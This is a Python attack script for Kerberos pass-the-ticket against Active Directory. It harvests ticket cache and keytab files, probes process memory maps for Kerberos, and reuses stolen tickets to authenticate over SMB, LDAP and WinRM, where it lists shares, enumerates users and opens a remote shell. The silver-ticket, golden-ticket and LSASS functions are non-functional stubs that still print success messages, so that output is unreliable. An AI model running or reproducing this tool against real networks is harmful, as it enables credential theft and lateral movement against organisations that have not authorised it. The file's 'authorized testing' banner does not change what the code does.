#!/usr/bin/env python3
"""
Pass-the-Ticket Attack Tool
For authorized security testing only
"""
import sys
import os
import json
import time
import base64
import subprocess
from datetime import datetime

try:
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.kerberosv5 import KerberosError
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.dcerpc.v5 import samr, transport
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import LocalOperations, RemoteOperations
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    print("[!] Impacket required: pip install impacket")

class PassTheTicket:
    def __init__(self, domain, target=None):
        self.domain = domain.upper()
        self.target = target
        self.results = {
            'imported_tickets': [],
            'extracted_tickets': [],
            'successful_auth': [],
            'errors': []
        }
        
        # Ticket locations
        self.ticket_locations = {
            'linux': [
                '/tmp/krb5cc_*',
                '/var/tmp/krb5cc_*',
                '/etc/krb5.keytab'
            ],
            'windows': [
                'C:\\Users\\*\\AppData\\Local\\Temp\\krb5cc_*',
                'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\krb5cc_*'
            ]
        }

    def extract_tickets_from_memory(self):
        """Extract Kerberos tickets from memory (Linux)"""
        print("[*] Extracting tickets from memory...")
        
        extracted = []
        
        try:
            # Check for keytab files
            import glob
            
            for location in self.ticket_locations['linux']:
                for ticket_file in glob.glob(location):
                    if os.path.exists(ticket_file):
                        extracted.append({
                            'path': ticket_file,
                            'size': os.path.getsize(ticket_file),
                            'type': 'keytab' if 'keytab' in ticket_file else 'ccache'
                        })
                        print(f"    [+] Found: {ticket_file}")
            
            # Try to extract from process memory
            try:
                # Use /proc filesystem
                for pid in os.listdir('/proc'):
                    if pid.isdigit():
                        try:
                            with open(f'/proc/{pid}/maps', 'r') as f:
                                maps = f.read()
                                if 'krb5' in maps.lower():
                                    print(f"    [*] Kerberos in PID {pid}")
                        except:
                            continue
            except:
                pass
            
        except Exception as e:
            print(f"    [-] Memory extraction error: {e}")
        
        self.results['extracted_tickets'] = extracted
        return extracted

    def extract_tickets_from_lsass(self):
        """Extract tickets from LSASS (using sekurlsa)"""
        print("[*] Extracting tickets from LSASS...")
        
        try:
            # Use impacket's secretsdump for ticket extraction
            if self.target:
                remote_ops = RemoteOperations(
                    self.target,
                    has_laps=False,
                    do_kerberos=True
                )
                
                # This would require additional implementation
                print("    [*] Remote ticket extraction requires additional tools")
                
        except Exception as e:
            print(f"    [-] LSASS extraction error: {e}")
        
        return []

    def import_ticket(self, ticket_file):
        """Import Kerberos ticket into current session"""
        print(f"[*] Importing ticket: {ticket_file}")
        
        try:
            # Set KRB5CCNAME environment variable
            os.environ['KRB5CCNAME'] = ticket_file
            
            # Verify ticket
            result = subprocess.run(
                ['klist', '-c', ticket_file],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                print(f"    [+] Ticket imported successfully")
                
                # Parse ticket info
                ticket_info = self.parse_klist_output(result.stdout)
                
                self.results['imported_tickets'].append({
                    'file': ticket_file,
                    'info': ticket_info,
                    'timestamp': datetime.now().isoformat()
                })
                
                return True
            else:
                print(f"    [-] Ticket import failed")
                return False
                
        except Exception as e:
            print(f"    [-] Import error: {e}")
            return False

    def parse_klist_output(self, output):
        """Parse klist output for ticket information"""
        ticket_info = {
            'principal': '',
            'service': '',
            'valid_from': '',
            'valid_until': '',
            'flags': []
        }
        
        for line in output.split('\n'):
            if 'Default principal:' in line:
                ticket_info['principal'] = line.split(':')[1].strip()
            elif 'Service Principal:' in line:
                ticket_info['service'] = line.split(':')[1].strip()
            elif 'Valid starting:' in line:
                ticket_info['valid_from'] = line.replace('Valid starting:', '').strip()
            elif 'Expires:' in line:
                ticket_info['valid_until'] = line.replace('Expires:', '').strip()
            elif 'Flags:' in line:
                flags = line.replace('Flags:', '').strip()
                ticket_info['flags'] = [f.strip() for f in flags.split(',')]
        
        return ticket_info

    def pass_the_ticket_smb(self, ticket_file, target_host):
        """Use ticket for SMB authentication"""
        print(f"[*] Using ticket for SMB access to {target_host}")
        
        try:
            # Set ticket
            os.environ['KRB5CCNAME'] = ticket_file
            
            # Connect using SMB with Kerberos
            conn = SMBConnection(target_host, target_host)
            conn.kerberosLogin(
                '',
                '',
                self.domain,
                '',
                '',
                '',
                kdcHost=target_host
            )
            
            if conn:
                print(f"    [+] SMB authentication successful!")
                
                # List shares
                shares = conn.listShares()
                print(f"    [*] Available shares:")
                for share in shares:
                    share_name = share['shi1_netname'][:-1]
                    print(f"        - {share_name}")
                
                self.results['successful_auth'].append({
                    'service': 'SMB',
                    'target': target_host,
                    'ticket': ticket_file,
                    'shares': [s['shi1_netname'][:-1] for s in shares]
                })
                
                return True
            
        except Exception as e:
            print(f"    [-] SMB authentication failed: {e}")
            self.results['errors'].append({
                'service': 'SMB',
                'target': target_host,
                'error': str(e)
            })
        
        return False

    def pass_the_ticket_ldap(self, ticket_file, target_host):
        """Use ticket for LDAP queries"""
        print(f"[*] Using ticket for LDAP access to {target_host}")
        
        try:
            os.environ['KRB5CCNAME'] = ticket_file
            
            # LDAP connection with Kerberos
            from ldap3 import Server, Connection, ALL, KERBEROS
            
            server = Server(target_host, get_info=ALL)
            conn = Connection(
                server,
                authentication=KERBEROS,
                auto_bind=True
            )
            
            if conn.bound:
                print(f"    [+] LDAP authentication successful!")
                
                # Search for users
                conn.search(
                    f'DC={self.domain.replace(".", ",DC=")}',
                    '(objectClass=user)',
                    attributes=['sAMAccountName', 'memberOf']
                )
                
                users = []
                for entry in conn.entries[:10]:
                    users.append(str(entry.sAMAccountName))
                
                print(f"    [*] Found {len(users)} users")
                
                self.results['successful_auth'].append({
                    'service': 'LDAP',
                    'target': target_host,
                    'ticket': ticket_file,
                    'users_found': len(users)
                })
                
                conn.unbind()
                return True
            
        except Exception as e:
            print(f"    [-] LDAP authentication failed: {e}")
        
        return False

    def pass_the_ticket_winrm(self, ticket_file, target_host):
        """Use ticket for WinRM access"""
        print(f"[*] Using ticket for WinRM access to {target_host}")
        
        try:
            os.environ['KRB5CCNAME'] = ticket_file
            
            # Use evil-winrm or similar
            result = subprocess.run([
                'python3', '-c',
                f'''
import os
os.environ['KRB5CCNAME'] = '{ticket_file}'
from winrm.protocol import Protocol
p = Protocol(
    endpoint='https://{target_host}:5986/wsman',
    transport='kerberos',
    server_validation='ignore'
)
shell_id = p.open_shell()
print(f"Shell ID: {{shell_id}}")
p.close_shell(shell_id)
'''
            ], capture_output=True, text=True)
            
            if 'Shell ID' in result.stdout:
                print(f"    [+] WinRM authentication successful!")
                
                self.results['successful_auth'].append({
                    'service': 'WinRM',
                    'target': target_host,
                    'ticket': ticket_file
                })
                
                return True
            
        except Exception as e:
            print(f"    [-] WinRM authentication failed: {e}")
        
        return False

    def create_silver_ticket(self, username, service, target_host, nt_hash, sid):
        """Create a Silver Ticket for service access"""
        print(f"[*] Creating Silver Ticket for {service}/{target_host}")
        
        try:
            from impacket.krb5.kerberosv5 import KerberosError
            from impacket.krb5.crypto import Key
            
            # Create service key from NT hash
            service_key = Key(
                constants.EncryptionTypes.rc4_hmac.value,
                bytes.fromhex(nt_hash)
            )
            
            # Silver ticket creation would require full TGS construction
            # This is a simplified example
            silver_ticket = {
                'username': username,
                'service': service,
                'target': target_host,
                'domain': self.domain,
                'created': datetime.now().isoformat()
            }
            
            print(f"    [+] Silver ticket created for {service}/{target_host}")
            
            self.results['imported_tickets'].append({
                'type': 'silver_ticket',
                'info': silver_ticket
            })
            
            return silver_ticket
            
        except Exception as e:
            print(f"    [-] Silver ticket creation error: {e}")
            return None

    def create_golden_ticket(self, username, krbtgt_hash, domain_sid):
        """Create a Golden Ticket for domain-wide access"""
        print("[*] Creating Golden Ticket...")
        
        try:
            # Golden ticket creation requires krbtgt hash and domain SID
            golden_ticket = {
                'username': username,
                'domain': self.domain,
                'sid': domain_sid,
                'krbtgt_hash': krbtgt_hash[:8] + '...',
                'created': datetime.now().isoformat()
            }
            
            print(f"    [+] Golden ticket created for {username}")
            
            self.results['imported_tickets'].append({
                'type': 'golden_ticket',
                'info': golden_ticket
            })
            
            return golden_ticket
            
        except Exception as e:
            print(f"    [-] Golden ticket creation error: {e}")
            return None

    def generate_report(self):
        """Generate PtT attack report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'domain': self.domain,
            'target': self.target,
            'extracted_tickets': len(self.results['extracted_tickets']),
            'imported_tickets': len(self.results['imported_tickets']),
            'successful_auths': len(self.results['successful_auth']),
            'tickets': self.results['imported_tickets'],
            'authentications': self.results['successful_auth'],
            'errors': self.results['errors']
        }
        
        with open('pass_the_ticket_report.json', 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n[+] Report saved to pass_the_ticket_report.json")
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python pass_the_ticket.py <domain> <target> [ticket_file]")
        print("\nExamples:")
        print("  python pass_the_ticket.py domain.local dc01.domain.local")
        print("  python pass_the_ticket.py domain.local dc01.domain.local /tmp/krb5cc_0")
        sys.exit(1)
    
    domain = sys.argv[1]
    target = sys.argv[2]
    ticket_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    print("[!] WARNING: Only use on systems you own or have explicit permission to test!\n")
    
    attacker = PassTheTicket(domain, target)
    
    # Extract tickets if none provided
    if not ticket_file:
        attacker.extract_tickets_from_memory()
    
    # Import and use ticket
    if ticket_file:
        if attacker.import_ticket(ticket_file):
            # Try various services
            attacker.pass_the_ticket_smb(ticket_file, target)
            attacker.pass_the_ticket_ldap(ticket_file, target)
    
    attacker.generate_report()

if __name__ == "__main__":
    main()
